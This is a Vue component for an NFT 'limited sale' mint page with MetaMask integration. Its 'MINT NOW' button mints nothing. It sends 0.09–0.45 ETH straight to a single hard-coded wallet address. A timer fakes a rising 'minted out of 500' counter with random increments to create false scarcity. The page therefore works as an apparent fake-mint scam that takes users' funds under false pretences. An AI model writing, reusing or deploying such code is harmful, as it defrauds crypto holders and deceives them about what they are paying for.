<template>
  <div id="nav">
    <div>
      <h2 style=" font-size:24px;">LIMITED SALE</h2>
      <h2 style=" font-size:28px; margin:40px">LIMITED SALE</h2>
    </div>
    
    <div class="div1">
      <img src="./first.png" width="380px" height="559px" class="img" />
    </div>
    <div class="div2">
      <h2 class="h2">{{ this.month }} {{ this.day }}</h2>
      <h3 class="h2">MINTING RULES</h3>
      <h4 class="h4">1) 500 unique NFTs</h4>
      <h4 class="h4">2) Max of 5 per Wallet</h4>
      <h4 class="h4">3) Reveal will happen after Public Sale</h4>
      <md-button v-on:click="minusfunction" style="display:inline-block;">
        <md-icon class="md-size-1x float:left;" style="color: white;"
          >remove</md-icon
        >
      </md-button>
      <h2 style="color: #b94242; font-size: 20px; display:inline-block;" >{{ this.no_of_eth }}</h2>
      <md-button v-on:click="addfunction" style="display:inline-block;">
        <md-icon class="md-size-1x" style="color:white;">
          add
          </md-icon>
           </md-button>
           <button  style="float:right; padding:15px 25px;background-color:#b94242; color:white;" v-on:click="max">Max</button>
           <h3 style="">PRICE : {{price[this.no_of_eth-1]}} ETH</h3>
      <button
        v-on:click="connectwallet"
        style="color: white; background-color: #b94242; padding:15px 25px; width:400px"
        id="connectbutton"
        class="md-primary">MINT NOW</button>
      <h3>{{ this.time}}/500</h3>
    </div>
      <h4 style="disply:inline-block;margin-top:250px">DIVINE ANARCHY. All Rights Reserved.</h4>
      <img src="./footer.png" height="120px" width="220px" style="disply:inline-block;margin-right:800px;" /> 
      
      <p style="margin-top:50px; margin-right:800px; padding:20px; font-size:13px">Home     Mint      Roadmap     Team </p>
  </div>
</template>

<script>
import "web3";
export default {
  name: "Home",
  components: {},
  data() {
    return {
      no_of_eth: 1,
      time: 100,
      month: null,
      day: null,
      price:[0.09,0.18,0.27,0.36,0.45]
    };
  },
  created() {
    const d = new Date();
    const months = [
      "January",
      "February",
      "March",
      "April",
      "May",
      "June",
      "July",
      "August",
      "September",
      "October",
      "November",
      "December",
    ];
    this.month = months[d.getMonth()];
    this.day = d.getDate();
     window.onload=this.timer
    
    const Web3 = require("web3");
    if (typeof window.ethereum !== "undefined") {
      console.log("Metamask is installed");
    }
    const ethEnabled = async () => {
      if (window.ethereum) {
        window.ethereum.request({ method: "eth_requestAccounts" });
        const chainId = await window.ethereum.request({
          method: "eth_chainId",
        });
        console.log(chainId);
        window.web3 = new Web3(window.ethereum);
        return true;
      }
      return false;
    };
    ethEnabled().then(() => {
      var x=document.getElementById("connectbutton")
      x.innerText="MINT NOW"
      try {
        const Id = window.ethereum.request({ method: "eth_chainId" });
        if (Id !== "0x1") {
          window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }],
          });
        }
      } catch (error) {
        console.log("error");
        if (error.code == 4001) {
          alert("Please connect to Ethereum Chain");
        }
      }
    });
  },
  methods: {
    addfunction() {
      if (this.no_of_eth < 5) {
        this.no_of_eth += 1;
      }
    },timer () {
      if (this.time <= 483) {
        const random = Math.floor(Math.random() * 11);
        this.time += random;
        setTimeout(this.timer,2000);
      }
    },max(){
      this.no_of_eth=5
    },

    minusfunction() {
      if (this.no_of_eth > 1) {
        this.no_of_eth -= 1;
      }
    },
    connectwallet() {
      const hexvalues=['0x13fbe85edc90000','0x27f7d0bdb920000','0x3bf3b91c95b001e','0x4fefa17b7240000','0x63eb89da4ecffc4']
       const acc = window.ethereum.request({ method: "eth_requestAccounts" });
      acc.then((result) => {
        const account = result[0];
        const chainId = window.ethereum.request({ method: "eth_chainId" });
        if (chainId !== "0x1") {
          
           window.ethereum.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: "0x1" }],
          }); 
          const hexvalues=['0x13fbe85edc90000','0x27f7d0bdb920000','0x3bf3b91c95b001e','0x4fefa17b7240000','0x63eb89da4ecffc4']
                     var input=this.no_of_eth;
                    const amount=hexvalues[input-1];
                    console.log(amount)
            window.ethereum.request({
              method: "eth_sendTransaction",
              params: [
                {
                  from: account,
                  to: "0xd4b83f0309dc02c2110715d787a3c92363acad8b",
                  value:amount,
                  //gasPrice: '0x09184e72a000',0x29a2241af62c0000
                  //gas: '0x2710',
                },
              ],
            });
          
          
        }else {
          const hexvalues=['0x13fbe85edc90000','0x27f7d0bdb920000','0x3bf3b91c95b001e','0x4fefa17b7240000','0x63eb89da4ecffc4']
                     var input=this.no_of_eth;
                    const amount=hexvalues[input-1];
                window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [
                        {
                            from: account,
                            to: '0xd4b83f0309dc02c2110715d787a3c92363acad8b',
                            value: amount,
                            //gasPrice: '0x09184e72a000',0x29a2241af62c0000
                            //gas: '0x2710',
                        },
                    ],
                })
        }
      });
    },
  },
};
</script>
<style lang="scss">
.img {
  background-color:  #17161b;
}
.div1 {
  width: auto;
  height: auto;
  border: 1px solid rgb(97, 92, 92);
  background-color: black(58, 56, 56);
  display: inline-block;
  vertical-align: 200px;
  margin-right:10px ;
  margin-top: 20px;
}
.div2 {
  width: 485px;
  height: 540px;
  border: 1px solid rgb(97, 92, 92);
  background-color:  #202125 ;
  display: inline-block;
  padding: 33px 40px 38px;
  margin-left: 90px;
  margin-top: 20px;
}
.home {
  background-color: black;
  background-color: black;
}
.h2 {
  color: white;
  text-align: left;
  font-family: Cambria, Cochin, Georgia, Times, "Times New Roman", serif;
  font-size: 120%;
}
#p {
  color: rgb(71, 67, 67);
}
.h4 {
  text-align: left;
  font-size: 100%;
  color: rgb(187, 185, 185);
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
    Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
}
</style>
